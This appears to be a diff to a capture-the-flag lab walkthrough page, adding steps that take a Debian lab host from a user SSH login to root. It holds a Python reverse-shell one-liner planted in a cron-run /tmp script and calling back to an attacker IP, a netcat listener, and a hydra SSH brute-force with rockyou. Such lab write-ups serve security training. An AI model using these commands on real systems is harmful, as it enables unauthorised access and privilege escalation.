@@ -970,36 +970,55 @@ martin@secretsec.com
 sign_and_send_pubkey: no mutual signature supported
 kali@192.168.170.49's password:
 </code></pre></div>    </div>
-    <p>Running <code class="highlighter-rouge">googler</code> tool with that output found some page that talk about the same issue and give some solution:
-```
-─$ googler “sign_and_send_pubkey: no mutual signature supported”</p>
-  </li>
-  <li>
-    <p>Sign_and_send_pubkey: no mutual signature supported
-https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported</p>
-  </li>
-  <li>SSH-RSA key rejected with message “no mutual signature …
-https://confluence.atlassian.com/bitbucketserverkb/ssh-rsa-key-rejected-with-message-no-mutual-signature-algorithm-1026057701.html
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I have use the following command to get shell with martin user:
+    <p>Running <code class="highlighter-rouge">googler</code> tool with that output found some page that talk about the same issue and give some solution, you can also check on google about that issue of “sign_and_send_pubkey: no mutual signature supported”. I have use the following command to get shell with martin user:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i ./VDSoyuAXiO.txt martin@192.168.170.49 -p 22 -o PubkeyAcceptedKeyTypes=ssh-rsa
+...
+secret password :
+WELCOME !
+martin@debian:
 </code></pre></div>    </div>
-    <p>└─$ ssh -i ./VDSoyuAXiO.txt martin@192.168.170.49 -p 22 -o PubkeyAcceptedKeyTypes=ssh-rsa</p>
+  </li>
+  <li>System Enumeration: copy the <code class="highlighter-rouge">linpeas</code> file to the target and start enumerate the system, found that the users hadi and jimmy exist here, also it bring up the following cron job:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>martin@debian:~$ cat /etc/crontab
+...
+*/5   * * * *   jimmy   python /tmp/sekurity.py
+</code></pre></div>    </div>
+    <p>This mean that this sekurity.py script run as jimmy, checking tmp folder showed that this script not exist, which mean that we can create the reverse shell on python can save it on that sekurity.py name, it will work, but not  sure that jimmy have more privilege then the other, for that case we can use <code class="highlighter-rouge">msfvenom</code> to create the script, or use pre-prepared script <code class="highlighter-rouge">rshell.py</code>, or create one line of code and save it to that file name.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.216",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &gt; /tmp/sekurity.py
+</code></pre></div>    </div>
+    <p>Then change the mode to execute <code class="highlighter-rouge">chmod +x /tmp/sekurity.py</code>, and wait for reverse shell.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.216] from (UNKNOWN) [192.168.170.49] 51275
+bash: cannot set terminal process group (1514): Inappropriate ioctl for device
+bash: no job control in this shell
+jimmy@debian:~$ whoami
+whoami
+jimmy
+jimmy@debian:~$
+</code></pre></div>    </div>
+    <p>Enumerate that user jimmy, but didn’t found much.</p>
+  </li>
+  <li>Brute Forcing: since run enumeration for more then hour, trying somthing simple, so far we know that jimmy and hadi exist on that target, so trying run <code class="highlighter-rouge">su</code> directly from martin session or using <code class="highlighter-rouge">ssh</code> with that user. found nothing, so going for brute forcing:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /usr/share/wordlists/rockyou.txt | grep hadi &gt; hadi_pass.txt
+hydra -l hadi -P rockyou.txt 192.168.170.49 ssh -I
+</code></pre></div>    </div>
+    <p>After several minutes it found the password for hadi user:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hydra -l hadi -P hadi_pass.txt 192.168.170.49 ssh -I
+...
+[22][ssh] host: 192.168.170.49   login: hadi   password: hadi123
+1 of 1 target successfully completed, 1 valid password found
+</code></pre></div>    </div>
+  </li>
+  <li>Privilege Escalation: since I enumerate that hadi and found nothing interesting, also <code class="highlighter-rouge">sudo -l</code> didn’t work, trying to run <code class="highlighter-rouge">su</code> with the same password five us root:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hadi@debian:~$ su
+Password:
+root@debian:/home/hadi# whoami
+root
+root@debian:/home/hadi#
+</code></pre></div>    </div>
   </li>
 </ol>
-
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Mon Mar  4 20:16:35 2024 from 192.168.45.196</p>
-
-<p>READY TO ACCESS THE SECRET LAB ?</p>
-
-<p>secret password :
-WELCOME !
-martin@debian:~$
-```</p>
 
 <p>Bottleneck
 BrokenGallery
